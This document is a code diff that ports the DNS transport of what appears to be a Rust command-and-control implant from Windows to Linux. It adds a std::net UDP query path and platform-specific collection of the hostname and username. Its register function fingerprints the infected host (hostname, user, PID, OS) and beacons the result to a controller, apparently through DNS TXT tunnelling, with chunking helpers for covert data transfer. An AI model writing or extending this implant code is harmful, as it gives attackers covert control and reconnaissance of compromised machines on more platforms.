@@ -126,11 +126,13 @@ pub fn parse_dns_txt(buf: &[u8]) -> String {
     String::new()
 }
 
-// ── Raw UDP via WinSock2 ──────────────────────────────────────────────────────
+// ── Raw UDP via WinSock2 (Windows) ───────────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct WsaData([u8; 408]);
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct SockaddrIn {
     sin_family: u16,
@@ -139,12 +141,16 @@ struct SockaddrIn {
     sin_zero:   [u8; 8],
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct Timeval { tv_sec: i32, tv_usec: i32 }
 
+#[cfg(target_os = "windows")]
 type WsSocket = usize;
+#[cfg(target_os = "windows")]
 const WS_INVALID_SOCKET: WsSocket = !0usize;
 
+#[cfg(target_os = "windows")]
 #[link(name = "ws2_32")]
 extern "system" {
     fn WSAStartup(ver: u16, data: *mut WsaData) -> i32;
@@ -159,12 +165,14 @@ extern "system" {
     fn htons(n: u16) -> u16;
 }
 
+#[cfg(target_os = "windows")]
 fn ip_to_u32(ip: &str) -> u32 {
     let mut s = ip.to_string();
     s.push('\0');
     unsafe { inet_addr(s.as_ptr()) }
 }
 
+#[cfg(target_os = "windows")]
 pub fn dns_query(server: &str, qname: &str) -> String {
     let (host, port) = if let Some(i) = server.rfind(':') {
         let p: u16 = server[i+1..].parse().unwrap_or(53);
@@ -201,6 +209,32 @@ pub fn dns_query(server: &str, qname: &str) -> String {
     }
 }
 
+// ── Raw UDP via std::net::UdpSocket (Linux / non-Windows) ────────────────────
+
+#[cfg(not(target_os = "windows"))]
+pub fn dns_query(server: &str, qname: &str) -> String {
+    use std::net::UdpSocket;
+    let (host, port) = if let Some(i) = server.rfind(':') {
+        let p: u16 = server[i+1..].parse().unwrap_or(53);
+        (&server[..i], p)
+    } else {
+        (server, 53u16)
+    };
+    let msg = build_dns_query(qname);
+    let sock = match UdpSocket::bind("0.0.0.0:0") {
+        Ok(s) => s,
+        Err(_) => return String::new(),
+    };
+    let addr = format!("{}:{}", host, port);
+    if sock.send_to(&msg, &addr).is_err() { return String::new(); }
+    sock.set_read_timeout(Some(std::time::Duration::from_secs(5))).ok();
+    let mut buf = [0u8; 4096];
+    match sock.recv_from(&mut buf) {
+        Ok((n, _)) => parse_dns_txt(&buf[..n]),
+        Err(_) => String::new(),
+    }
+}
+
 // ── Chunk helper ──────────────────────────────────────────────────────────────
 
 pub fn chunk_str(s: &str, size: usize) -> Vec<String> {
@@ -218,14 +252,31 @@ pub fn chunk_str(s: &str, size: usize) -> Vec<String> {
 // ── Transport operations ──────────────────────────────────────────────────────
 
 pub fn register(server: &str, domain: &str) -> Option<String> {
-    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
+    let hostname = {
+        #[cfg(target_os = "windows")]
+        { std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into()) }
+        #[cfg(not(target_os = "windows"))]
+        {
+            std::fs::read_to_string("/proc/sys/kernel/hostname")
+                .map(|s| s.trim().to_string())
+                .unwrap_or_else(|_| std::env::var("HOSTNAME").unwrap_or_else(|_| "UNKNOWN".into()))
+        }
+    };
     let pid      = std::process::id();
     let agent_id = make_agent_id(&hostname, pid);
 
+    let username = {
+        #[cfg(target_os = "windows")]
+        { std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into()) }
+        #[cfg(not(target_os = "windows"))]
+        { std::env::var("USER").or_else(|_| std::env::var("LOGNAME")).unwrap_or_else(|_| "UNKNOWN".into()) }
+    };
+    let os_str = if cfg!(target_os = "windows") { "windows/amd64" } else { "linux/amd64" };
+
     let body = serde_json::json!({
         "hostname": hostname,
-        "username": std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
-        "os":       "windows/amd64",
+        "username": username,
+        "os":       os_str,
         "pid":      pid,
         "aes_key":  "",
         "language": "rust",
